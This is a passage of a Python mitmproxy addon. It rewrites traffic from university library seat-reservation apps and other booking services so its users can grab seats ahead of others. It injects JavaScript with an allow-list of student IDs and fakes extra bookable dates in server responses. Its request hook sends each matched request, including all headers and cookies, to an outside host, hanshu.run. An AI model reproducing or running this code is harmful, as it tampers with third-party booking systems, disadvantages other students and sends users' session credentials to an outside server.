  #             data: JSON.stringify(data),
  #             success: function (res) {
  #                 if(res.state=="1"){
  #                   document.querySelector('#table').innerHTML = `[${owoIndex}]` + res.content
  #                   alert('抢座成功')
  #                     location.href="/yuyue/MyBooks"
  #                 }
  #                 else{
  #                   document.querySelector('#table').innerHTML = `[${owoIndex}]` + res.content
  #                 }
  #             }
  #         })
  #       }

  #       }
  #       </script>
  #       '''
  #     ]
  #   ]
  # },
  # 座位预约App
#   {
#     "url": ".*//zwyy-lib.chzu.edu.cn:9091/tsgintf/main/service|.*//220.180.184.9:9091/tsgintf/main/service",
#     "hack": [
#       [
#         '''<script type="text/javascript">''', 
#         '''<script type="text/javascript">
        
#         api.showProgress = function (e) {console.log(e);checkSubmitFlg = false;}
#         let allowList = ["2018213345", "2018212065", "2018210406", "2016214105", "2018211565", "2018211147", "2019214347", "2018214474", "2018210624", "2018210215", "2018212107", "2018211452", "2018211793", "2019214146", "2020220440", "2018210861", "2019211932", "2018212985", "2018210360", "2019211984", "2018211008", "2018210087", "2018212133", "2018211547", "2018212096", "2018213401", "2018213549"]
#         if (allowList.includes(_key)) {
#           alert('载入成功，现在关闭代理功能也可以使用功能，并获得更快速度。点击座位即可完成原来长按确认的操作，开抢前几秒一直点击基本可以预约到座位。')
#           document.querySelector('#randomBtn').outerHTML = `<div class="aui-btn aui-btn-info aui-margin-t-10" onclick="suiji()">随机分配</div>`
#           setTimeout(() => {
#               document.querySelectorAll('.seatFont').forEach(element => {
                
#                 element.onclick = function (e) {
                  
#                   var sate = e.target.getAttribute("hid")
#                   doPreSeat(sate, roomId,GetDateStr(0), _key, startHour,endHour,'0')
#                 }
#             });
#           }, 100);
#         } else {
#           alert('未授权用户: ' + _key)
#         }
#         function randomNum(minNum,maxNum){ 
#           switch(arguments.length){ 
#             case 1: 
#               return parseInt(Math.random()*minNum+1,10); 
#               break; 
#             case 2: 
#               return parseInt(Math.random()*(maxNum-minNum+1)+minNum,10); 
#               break; 
#             default: 
#               return 0; 
#               break; 
#           } 
#         } 
#         function suiji () {
#           var list = document.querySelectorAll('.seatFont')
#           ele = list[randomNum(0, list.length - 1)]
#           var sate = ele.getAttribute("hid")
#           // alert(sate)
#           doPreSeat(sate, roomId,GetDateStr(0), _key, startHour,endHour,'0')
#         }
# function GetDateStr(AddDayCount) {
#     var dd = new Date();
#     dd.setDate(dd.getDate()+AddDayCount);//获取AddDayCount天后的日期
#     var y = dd.getFullYear();
#     var m = dd.getMonth()+1;//获取当前月份的日期
#     var d = dd.getDate() + 1;
#     return y+"-"+m+"-"+d;
# }

# '''
#       ],
#     ]
#   },
  # {
  #   "url": ".*//wmatch-api-1210.wangqiuban.cn/weather!getDateWeatherBySku",
  #   "hack": [
  #     [
  #       ''']}''',
  #       ''',{"week":"\xe6\x98\x9f\xe6\x9c\x9f\xe5\x9b\x9b","date":"''' + nextDaySecurity(8) + '''","weather":"\xe5\xa4\x9a\xe4\xba\x91","type":"PARTLY_CLOUDY_DAY"}]}''',
  #     ]
  #   ]
  # },
  # {
  #   "url": ".*//leosys.cn/hlju/rest/v2/free/filters",
  #   "hack": [
  #     [
  #       '"]},',
  #       '","' + nextDay(1) + '"]},',
  #     ]
  #   ]
  # },
  # {
  #   "url": ".*//www.360banke.com/xiaotu/Seatresv/GetResvInfo.asp",
  #   "hack": [
  #     [
  #       ']}]}',
  #       ']},{"date": "' + nextDay(1) + '","weekday": "\xd0\xc7\xc6\xda\xc8\xfd","start": "07:00","end": "22:30","timeslot": ["07:00","22:30"]}]}',
  #     ]
  #   ]
  # }
]

reqHackList = [
  # 座位预约
  # ".*//211.70.171.14:9999/tsgintf/main/service",
  # ".*//zwyy-lib.chzu.edu.cn:9091/tsgintf/main/service"
  "http://sw.xianmaigu.com/api/YySeatAppointment/addes.html",
  "https://wx.xianmaigu.com/scwgy_seat/api/seatAppointment/seaAappointment.html",
  "https://prod.zixishi.tech/srapi/app/member/supplier-or-merchant-info/v1/2/211",
  "https://uwei.dataesb.com/webWechat/SeatBooking/submitBooking",
  "https://uwei.dataesb.com/webWechat/SeatBooking/initSeat",
  # 穿梭巴士
  "wx.hzmbus.com/webapi/manage/query.book.info.data"
  # "dappweb-api.huolala.cn/index.php"
]


class ModifyResponse:

  def response(self,flow):
    for item in hackList:
      if ('url' in item and flow.request.url):
        findList = pattern = re.compile(item['url']).findall(flow.request.url)
        if (len(findList) > 0):
          # ctx.log.info('请求被重写:' + flow.request.url)
          # flow.response.headers['Expires'] = 0
          flow.response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate'
          flow.response.headers['Pragma'] = 'no-cache'
          returnText = flow.response.text
          # print(returnText)
          if ('</body>' in returnText):
            returnText = returnText.replace('</body>', '''<div id="resCookie" style="display: none;">%s</div>\r\n<script>var resCookie = '%s';var resReferer = '%s'</script>\r\n</body>''' % (flow.request.headers.get('cookie'), flow.request.headers.get('cookie'), flow.request.headers.get('referer')))
          for value in item['hack']:
            if (value[0] != ""):
              returnText = returnText.replace(value[0], value[1])
            else:
              returnText = value[1]
          flow.response.set_text(returnText)
  
  def request(self, flow):
    if (flow.request.url):
      for item in reqHackList:
        findList = pattern = re.compile(item).findall(flow.request.url)
        if (len(findList) > 0):
          # print(flow.request.headers)
          # flow.request.headers['owoHost'] = flow.request.host
          # flow.request.headers['owoPath'] = flow.request.path
          # flow.request.path = "/redirect"
          # flow.request.host = "hanshu.run"
          # flow.request.port = 80
          # flow.request.scheme = 'http'
          headersTemp = {}
          for item in flow.request.headers:
            headersTemp[item] = flow.request.headers[item]
          conn = http.client.HTTPSConnection("hanshu.run")
          # flow.request.text = 'asd'
          conn.request("POST", "/redirect", json.dumps({
            "url": flow.request.url,
            "path": flow.request.path,
            "host": flow.request.host,
            "port": flow.request.port,
            "scheme": flow.request.scheme,
            "headers": headersTemp,
            "data": flow.request.text
          }), {
            'Content-Type': 'application/json',
          })
          res = conn.getresponse()
          data = res.read()
          # print(data.decode("utf-8"))
        
addons = [
  ModifyResponse()
]